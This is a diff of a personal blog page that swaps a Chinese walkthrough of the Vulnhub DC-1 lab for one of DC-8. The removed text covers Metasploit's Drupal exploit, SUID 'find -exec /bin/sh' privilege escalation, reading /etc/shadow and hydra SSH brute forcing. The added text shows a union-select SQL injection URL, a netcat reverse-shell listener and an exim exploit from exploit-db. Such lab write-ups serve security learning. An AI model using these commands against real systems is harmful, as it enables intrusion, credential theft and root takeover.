@@ -13,7 +13,7 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
   <title>
     
-      Vulnhub之DC-1 find 提权骚思路 | ST0new Blog
+      Vulnhub DC-8 | ST0new Blog
     
   </title>
   <meta name="author" content="ST0new">
@@ -165,7 +165,7 @@
 	<!-- Page title -->
 	<p>
 		
-			当前文章&nbsp;:&nbsp;《Vulnhub之DC-1 find 提权骚思路》
+			当前文章&nbsp;:&nbsp;《Vulnhub DC-8》
 		
 	</p>
 
@@ -286,8 +286,8 @@
 	<div class="article-title">
 		<i class="fa fa-paper-plane-o" aria-hidden="true"></i>
 		
-	<a href="/2019/10/04/靶机/Vulnhub DC-1/" itemprop="url">
-		Vulnhub之DC-1 find 提权骚思路
+	<a href="/2019/10/04/靶机/Vulnhub-DC-8/" itemprop="url">
+		Vulnhub DC-8
 	</a>
 
 	</div>
@@ -300,8 +300,8 @@
 
 	发布于
 
-	<a href="/2019/10/04/靶机/Vulnhub DC-1/" itemprop="url">
-		<time datetime="2019-10-04T02:58:07.000Z" itemprop="datePublished">
+	<a href="/2019/10/04/靶机/Vulnhub-DC-8/" itemprop="url">
+		<time datetime="2019-10-04T03:02:24.000Z" itemprop="datePublished">
 	  		2019-10-04
 	  </time>
 	</a>
@@ -318,9 +318,9 @@
 
 	更新于
 
-	<a href="/2019/10/04/靶机/Vulnhub DC-1/" itemprop="url">
-		<time datetime="2019-10-04T02:58:07.000Z" itemprop="dateUpdated">
-	  		2019-10-04
+	<a href="/2019/10/04/靶机/Vulnhub-DC-8/" itemprop="url">
+		<time datetime="2019-10-04T03:02:24.000Z" itemprop="dateUpdated">
+	  		2019-10-21
 	  </time>
 	</a> 
 
@@ -331,8 +331,8 @@
 			<i class="fa fa-tags"></i>
 			
 	
-		<a href="/tags/Suid-提权/" class=" ">
-			Suid 提权
+		<a href="/tags/drupal提权/" class=" ">
+			drupal提权
 		</a>
 	
 		
@@ -341,7 +341,7 @@
 		
 
 	
-    <span class="leancloud_visitors" id="/2019/10/04/靶机/Vulnhub DC-1/_visitors" data-url="/2019/10/04/靶机/Vulnhub DC-1/" data-title="Vulnhub之DC-1 find 提权骚思路">
+    <span class="leancloud_visitors" id="/2019/10/04/靶机/Vulnhub-DC-8/_visitors" data-url="/2019/10/04/靶机/Vulnhub-DC-8/" data-title="Vulnhub DC-8">
        	<i class="fa fa-eye"></i>
        	热度
         <i class="leancloud_visitors_count" id="leancloud_visitors_count">0</i>
@@ -351,7 +351,7 @@
 
 
 	
-    <span class="leancloud_likes" id="/2019/10/04/靶机/Vulnhub DC-1/_likes" data-url="/2019/10/04/靶机/Vulnhub DC-1/" data-title="Vulnhub之DC-1 find 提权骚思路" rel="unlike">
+    <span class="leancloud_likes" id="/2019/10/04/靶机/Vulnhub-DC-8/_likes" data-url="/2019/10/04/靶机/Vulnhub-DC-8/" data-title="Vulnhub DC-8" rel="unlike">
         <i class="fa fa-heart"></i>
         喜欢
         <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
@@ -360,83 +360,67 @@
 	</div>
 
 	<div class="article-content" id="article-content">
-		<p>DC-1 学习</p>
-<a id="more"></a>
-
-<h1 id="Vulnhub简介"><a href="#Vulnhub简介" class="headerlink" title="Vulnhub简介"></a>Vulnhub简介</h1><p>Vulnhub是一个提供各种漏洞环境的靶场平台，供安全爱好者学习渗透使用，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞，需要使用VMware或者VirtualBox运行。每个镜像会有破解的目标，大多是Boot2root，从启动虚机到获取操作系统的root权限和查看flag。<br>网址：<a href="https://www.vulnhub.com" target="_blank" rel="noopener">https://www.vulnhub.com</a></p>
-<h2 id="DC-系列"><a href="#DC-系列" class="headerlink" title="DC 系列"></a>DC 系列</h2><p>DC总共有6个靶机，本次我们使用的靶机是DC-1 ，难度不大，适合新手去实验和入门，<br>下载地址:  <a href="http://www.five86.com/dc-1.html" target="_blank" rel="noopener">http://www.five86.com/dc-1.html</a></p>
-<h2 id="DC-1-介绍"><a href="#DC-1-介绍" class="headerlink" title="DC-1 介绍"></a>DC-1 介绍</h2><p>DC-1 没有烧脑的难度，重点是需要我们去掌握一些常用的渗透工具，比如nmap，hydra，msf等等。<br>作者说flag在root目录下，那么我们最终的任务就是去提权或者获取到有root权限去执行命令。<br>初次接触可能需要去百度相关的知识，所以努力的你肯定会有所进步，</p>
-<h1 id="简要说明一下安装"><a href="#简要说明一下安装" class="headerlink" title="简要说明一下安装"></a>简要说明一下安装</h1><ol>
-<li>下载好之后解压，然后使用vmware打开ova文件。<br><img src="https://img-blog.csdnimg.cn/20190523224514645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">2. 之后可能会提示报错，不用管忽略。由于是桥接网络，所以我们需要设置一下，我选择的是NAT<br><img src="https://img-blog.csdnimg.cn/20190523224758585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">准备就绪，可以开始了！！</li>
+		<p>[TOC]</p>
+<h1 id="vlunhub-dc8"><a href="#vlunhub-dc8" class="headerlink" title="vlunhub-dc8"></a>vlunhub-dc8</h1><h2 id="0x00-下载地址"><a href="#0x00-下载地址" class="headerlink" title="0x00 下载地址"></a>0x00 下载地址</h2><p><a href="http://www.five86.com/dc-8.html" target="_blank" rel="noopener">DC-8</a></p>
+<h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><p>kali：192.168.64.133</p>
+<p>dc-8：192.168.64.155</p>
+<h2 id="0x02-复现"><a href="#0x02-复现" class="headerlink" title="0x02 复现"></a>0x02 复现</h2><ol>
+<li><p>扫描端口</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191020221007.png" alt></p>
+</li>
+<li><p>查看网站，查找有用信息</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191020224511.png" alt></p>
+<p>发现在访问时url处为nid=1 这种类型，可能存在sql注入，测试发现报错</p>
+</li>
+<li><p>获取用户名和密码</p>
+<p>字段为1 </p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021093629.png" alt></p>
+<p>数据库 <code>d7db</code></p>
+<p><code>http://192.168.64.155/?nid=-1%20union%20all%20select%20database()%20--+</code></p>
+<p>拿到用户名和密码</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021094308.png" alt></p>
+<p>使用john破解</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021095827.png" alt></p>
+<p>接下来通过之前扫描的的信息中获取到的登录界面登录</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021095720.png" alt></p>
+</li>
+<li><p>登录后台</p>
+<p>和dc-7 一样，寻找可以执行php语句的地方</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021103459.png" alt></p>
+<p>测试执行语句，在<code>form settings</code>写入phpinfo</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021103916.png" alt></p>
+</li>
+<li><p>反弹shell</p>
+<p>尝试反弹shell</p>
+<p>kali <code>nc -lvvp 4444</code></p>
+<p>web页面处</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021104353.png" alt></p>
+<p>kali处成功监听，获取交互式shell</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021104646.png" alt></p>
+</li>
+<li><p>信息收集</p>
+<p>通过vps下载linenum 去获取服务器信息</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021105414.png" alt></p>
+<p>这里尝试一下 sudo提权，需要密码 ，版本没有类似的漏洞，</p>
+<p>之后在suid处存在一处可疑文件，查看版本，发现存在可利用漏洞</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021110950.png" alt></p>
+</li>
+<li><p>提权</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021111447.png" alt></p>
+<p>利用此漏洞尝试提权</p>
+<p>查看使用方式：<a href="https://www.exploit-db.com/exploits/46996" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/46996</a></p>
+<p>尝试利用<code>./46996.sh -m setuid</code>或<code>./46996.sh -m netcat</code> 提权</p>
+<p>报错：</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021112142.png" alt></p>
+<p>搜索发现这个报错是由于windows下编辑上传到linux下执行导致的</p>
+<p>解决方法</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021113723.png" alt></p>
+<p>成功获取root权限</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021113857.png" alt></p>
+<p>cd到root下 查看flag</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191021113941.png" alt></p>
+</li>
 </ol>
-<h1 id="开始拿flag喽，激动不"><a href="#开始拿flag喽，激动不" class="headerlink" title="开始拿flag喽，激动不"></a>开始拿flag喽，激动不</h1><h2 id="介绍下环境"><a href="#介绍下环境" class="headerlink" title="介绍下环境"></a>介绍下环境</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">网段：192.168.248.0/24</span><br><span class="line">主机：192.168.248.149</span><br><span class="line">靶机：192.168.248.152</span><br></pre></td></tr></table></figure>
-
-<p>这里大家需要注意一下，因为我是用的ubuntu，所以有的命令需要加sudo，如果大家用的是kali就不需要了</p>
-<h2 id="扫描网段"><a href="#扫描网段" class="headerlink" title="扫描网段"></a>扫描网段</h2><p>命令：<code>nmap -sn 192.168.248.0/24</code></p>
-<p><img src="https://img-blog.csdnimg.cn/20190523225316403.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="扫描主机"><a href="#扫描主机" class="headerlink" title="扫描主机"></a>扫描主机</h2><p>命令：<code>nmap -sS 192.168.248.152</code></p>
-<p>-sS ：半开放扫描（非3次握手的tcp扫描）比较安全，不会产生会话，几乎不会产生日志，工作中常用，建议大家不要直接全上的去扫，稳妥更稳妥，需要有root权限<br><img src="https://img-blog.csdnimg.cn/20190523225645455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="收集信息，查看目标主页"><a href="#收集信息，查看目标主页" class="headerlink" title="收集信息，查看目标主页"></a>收集信息，查看目标主页</h2><p>我这里尝试了弱密码，好像没啥用，看到了网站的管理系统，尝试查找相关漏洞攻击<br><img src="https://img-blog.csdnimg.cn/20190523225754230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="使用Metasploit查找漏洞获取shell"><a href="#使用Metasploit查找漏洞获取shell" class="headerlink" title="使用Metasploit查找漏洞获取shell"></a>使用Metasploit查找漏洞获取shell</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wxy@wxy-virtual-machine:~$ msfconsole -q</span><br><span class="line">msf5 &gt; search drupal</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20190523225943748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">选择最新最有效的的去尝试</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/unix/webapp/drupal_drupalgeddon2</span><br></pre></td></tr></table></figure>
-
-<p>查看选项，设置相关参数<br><img src="https://img-blog.csdnimg.cn/20190523231122428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">设置rhosts</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhosts 192.168.248.152</span><br></pre></td></tr></table></figure>
-
-<p>执行</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit</span><br></pre></td></tr></table></figure>
-
-<p>成功获取shell<br><img src="https://img-blog.csdnimg.cn/20190523232130797.png" alt="在这里插入图片描述">获取交互式shell<br><img src="https://img-blog.csdnimg.cn/20190523232203708.png" alt="在这里插入图片描述"></p>
-<h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ ls</span><br><span class="line">发现flag1 文件</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20190523232358393.png" alt="在这里插入图片描述">搜索flag文件，</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ find / -name  flag</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20190523232823474.png" alt="在这里插入图片描述">查看passwd文件</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ cat /etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20190523232626814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">发现特别的用户，尝试去查看用户的目录<br>找到了一个flag4.txt,这里是作者迷惑你的一个flag，</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ cd /home</span><br><span class="line">www-data@DC-1:/home$ ls</span><br><span class="line">flag4</span><br><span class="line">www-data@DC-1:/home$ cd /www-data@DC-1:/home/flag4$ ls</span><br><span class="line">flag4.txt</span><br><span class="line">www-data@DC-1:/home/flag4$ cat flag4.txt</span><br><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it's not that easy.  Or maybe it is?</span><br></pre></td></tr></table></figure>
-
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>既然我们在普通用户下没有找到flag，我们只能去提权了</p>
-<p>查看shadow文件,发现权限不足</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ cat /etc/shadow</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20190523233645786.png" alt="在这里插入图片描述"><br>查找系统中具有suid设置的所有文件</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20190523234336213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">这里去查看了下大佬的骚思路，找到了find提权方式,成功拿到shell<br>说明提权方式,为什么我们会想到用find提权，作者在flag3也告诉了我们，所以如果大家要一步一步的走，请移步后面flag到flag3查找过程<br>利用find的权限，使用exec去执行一些root权限的命令。</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ touch wxy</span><br><span class="line">www-data@DC-1:/var/www$ find / -name wxy -exec "whoami" \;</span><br><span class="line">www-data@DC-1:/var/www$ find / -name -exec "/bin/sh" \;</span><br><span class="line"># ls</span><br><span class="line"># cd /root</span><br><span class="line"># ls</span><br><span class="line"># cat thefinalflag.txt</span><br><span class="line">Well done!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you've enjoyed this and learned some new skills.</span><br><span class="line"></span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20190523234628328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 提权成功，但是我们怎么能满足于只拿到flag，接下来，就是寻找flag之旅</p>
-<h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>这个比较好找，我直接ls了当前的目录就发现了<br><img src="https://img-blog.csdnimg.cn/20190523235318529.png" alt="在这里插入图片描述">查看flag1.txt</p>
-<p><img src="https://img-blog.csdnimg.cn/20190523235359943.png" alt="在这里插入图片描述"></p>
-<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>那么我们就去查看cms配置文件,顺便收获flag2<br>发现sites文件，逐步进入查看发现settings.php</p>
-<p><img src="https://img-blog.csdnimg.cn/20190523235801197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看settings.php,获取到了flag2 和数据库密码<br><img src="https://img-blog.csdnimg.cn/20190523235920686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">登录数据库</p>
-<p><img src="https://img-blog.csdnimg.cn/20190524000305209.png" alt="在这里插入图片描述">查看当前数据库<br><img src="https://img-blog.csdnimg.cn/20190524000353118.png" alt="在这里插入图片描述"><br>查看表drupaldb<br><code>show tables from drupaldb;</code><br><img src="https://img-blog.csdnimg.cn/20190524000703263.png" alt="在这里插入图片描述"><br>查看users表中的信息，发现两个用户<br><img src="https://img-blog.csdnimg.cn/20190524001240308.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">搜索drupal的加密方式，尝试破解或者置换密码<br>参考链接：<a href="http://drupalchina.cn/node/2128" target="_blank" rel="noopener">http://drupalchina.cn/node/2128</a></p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ php scripts/password-hash.sh admin   </span><br><span class="line">php scripts/password-hash.sh admin</span><br><span class="line"></span><br><span class="line">password: admin 		hash: $S$DVoemoxFFm9/7b0MuI7NDlBLlzty2pkOYF8Noj/IkodVTd9u84qV</span><br></pre></td></tr></table></figure>
-
-<p>复制 加密的密码，去数据库修改</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; update users set pass ="$S$DVoemoxFFm9/7b0MuI7NDlBLlzty2pkOYF8Noj/IkodVTd9u84qV" where name="admin";</span><br></pre></td></tr></table></figure>
-
-<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>去网站登录<br><img src="https://img-blog.csdnimg.cn/20190524002525352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">发现flag3<br><img src="https://img-blog.csdnimg.cn/20190524002558428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">根据这个提示，在结合上面find具有suid的权限，我们去搜索提权可以获取到使用find提权去执行root权限，最后拿到最终flag。</p>
-<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>这个在flag4用户目录下,我们切换到flag4目录下<code>cd /home/flag4</code><br><img src="https://img-blog.csdnimg.cn/20190524065908178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">这里还有一种做法，<br>我们刚开始如果发现了flag4 用户，可以尝试去爆破，我们推荐hydra这个神器，如果你没有爆破字典，可以把john的拿过来用</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wxy@wxy-virtual-machine:~$ hydra -l flag4 -P /home/wxy/Desktop/password_dict/Weak_password.txt ssh://192.168.248.152</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20190524070708516.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>爆破成功后，我们尝试登录拿到flag4</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wxy@wxy-virtual-machine:~$ ssh flag4@192.168.248.152</span><br><span class="line">flag4@DC-1:~$ ls</span><br><span class="line">flag4@DC-1:~$ cat flag4.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20190524070854357.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="最终flag"><a href="#最终flag" class="headerlink" title="最终flag"></a>最终flag</h2><p>我们已经知道了find的特殊之处，使用find去获取shadow文件。</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ find / -name wxy -exec "/bin/sh" \;</span><br><span class="line"># cat /etc/shadow</span><br><span class="line">或者</span><br><span class="line">www-data@DC-1:/etc$ find /etc/shadow -exec cat &#123;&#125; \;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20190524072046561.png" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20190524072409895.png" alt="在这里插入图片描述">我们尝试去解密，linux对密码是sha256的加密方式</p>
-<p>如果密码比较复杂，解密是费时有可能解不出来，我们查看对shadow的权限<br>发现root对其具有写权限，这里我们备份一份shadow，然后直接改里面的值，去登录<br><img src="https://img-blog.csdnimg.cn/20190524073726571.png" alt="在这里插入图片描述"><br>ps：这里想了几种办法都没用，大佬有更加骚的姿势，欢迎指点</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>重点是find提权<br>下来就是各种工具的熟练掌握</p>
-<hr>
-<p>永远不要停下你的步伐</p>
 	
 	</div>
 	
@@ -455,12 +439,12 @@
 	<span>
 		<a href="javascript: window.scrollTo(0, 0);">返回顶部</a>
 		
-			<a href="/2019/10/04/靶机/Vulnhub DC-2/" title="Vulnhub DC-2" rel="prev">
+			<a href="/2019/10/04/靶机/Vulnhub DC-4/" title="Vulnhub DC-4" rel="prev">
 				&laquo;上一篇
 			</a>
 		
 		
-			<a href="/2019/10/04/实用技巧/解决wireshark没有捕获端口的问题/" title="解决wireshark没有捕获端口的问题" rel="next">
+			<a href="/2019/10/04/靶机/Vulnhub-DC-7/" title="Vulnhub DC-7" rel="next">
 				下一篇&raquo;
 			</a>
 			
@@ -530,39 +514,6 @@ Vulnhub 之 DC-5 靶机复现前言本靶机只做学习使用，不要将其利
 							<a href="/2019/10/04/靶机/Vulnhub DC-5 /" title="DC-5 复现">				
 								
 								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="DC-5 复现"/>
-							</a>
-						</div>
-					</li>											
-			
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2019/10/04/靶机/Vulnhub-DC-8/" title="Vulnhub DC-8">
-								Vulnhub DC-8			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								十月 4日, 2019				
-							</p>
-							<p class="relate-post-content">
-								[TOC]
-vlunhub-dc80x00 下载地址DC-8
-0x01 环境kali：192.168.64.133
-dc-8：192.168.64.155
-0x02 复现
-扫描端口
-
-
-查看网站，查找有用信息
-
-发现在访问时url处为...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2019/10/04/靶机/Vulnhub-DC-8/" title="Vulnhub DC-8">				
-								
-								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="Vulnhub DC-8"/>
 							</a>
 						</div>
 					</li>											
@@ -676,6 +627,32 @@ DC...
 							<a href="/2019/10/04/靶机/Vulnhub DC-2/" title="Vulnhub DC-2">				
 								
 								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="Vulnhub DC-2"/>
+							</a>
+						</div>
+					</li>											
+			
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/10/04/靶机/Vulnhub DC-1/" title="Vulnhub之DC-1 find 提权骚思路">
+								Vulnhub之DC-1 find 提权骚思路			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十月 4日, 2019				
+							</p>
+							<p class="relate-post-content">
+								DC-1 学习
+
+
+Vulnhub简介Vulnhub是一个提供各种漏洞环境的靶场平台，供安全爱好者学习渗透使用，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞，需要使用VMware或者VirtualBox运行。每个镜像会有破...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/10/04/靶机/Vulnhub DC-1/" title="Vulnhub之DC-1 find 提权骚思路">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="Vulnhub之DC-1 find 提权骚思路"/>
 							</a>
 						</div>
 					</li>											
